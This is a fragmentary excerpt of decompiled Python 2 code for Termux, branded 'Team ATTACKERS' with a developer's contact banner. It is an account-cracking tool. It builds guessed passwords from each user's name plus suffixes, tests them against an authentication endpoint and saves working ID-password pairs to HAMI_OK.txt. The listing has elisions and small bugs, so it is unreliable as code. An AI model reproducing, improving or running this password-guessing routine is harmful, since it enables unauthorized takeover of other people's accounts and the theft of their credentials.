# Decompiled By HAMI
# Github : https://github.com/HAMI-CODER
#!/usr/bin/python2
# coding=utf-8
...
__author__ = 'VivekChandel'
__copyright = 'All rights reserved . Copyright  VivekXD'
os.system('termux-setup-storage')
CorrectUsername = '@SPYEYE'
os.system('clear')
loop = 'true'
while (loop == 'true'):
...
\033[1;94m█████████
\033[1;93m█▄█████▄█ 
\033[1;92m█▼▼▼▼▼______ -----__------__
\033[1;97m█ Team ATTACKERS
\033[1;93m█▲▲▲▲▲-----___----__//,,,,,----
\033[1;95m█████████
\033[1;99m__██____██___


\033[1;97m-----------------------------------------------
\033[1;92m>> PROGRAMER   : HAMI
\033[1;92m>> FACEBOOK    : HAMAD MALIK
\033[1;92m>> WHATSAPP    : +9203025604966
\033[1;97m-----------------------------------------------"""
...
def reg():
    ...
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923032594966')
        reg()
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;93m     CODER King Of Programs    '
    print 47 * '-'
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[OK-CP] ' + uid + ' | ' + pass3
                        ok = open('HAMI_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ol.close()
                        oks.append(uid + pass3)
        ...
        try:
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;31;1m[HAMI-OK] ' + uid + ' | ' + pass2
                    ok = open('HAMI_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    ols.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        ...
                        print '\x1b[1;31;1m[HAMI-OK] ' + uid + ' | ' + pass3
                        ok= open('HAMI_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
